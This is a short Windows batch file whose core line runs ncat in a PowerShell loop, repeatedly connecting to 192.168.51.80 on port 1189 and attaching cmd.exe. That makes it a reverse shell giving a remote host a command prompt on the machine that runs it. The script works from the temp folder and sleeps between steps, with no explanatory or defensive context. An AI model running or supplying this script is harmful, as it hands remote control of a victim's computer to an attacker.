@ECHO OFF
cd %TEMP%
powershell.exe sleep 5
powershell -command do {ncat 192.168.51.80 1189 -e cmd.exe} until ($ping)
powershell -command Start-Sleep -seconds 30
PAUSE
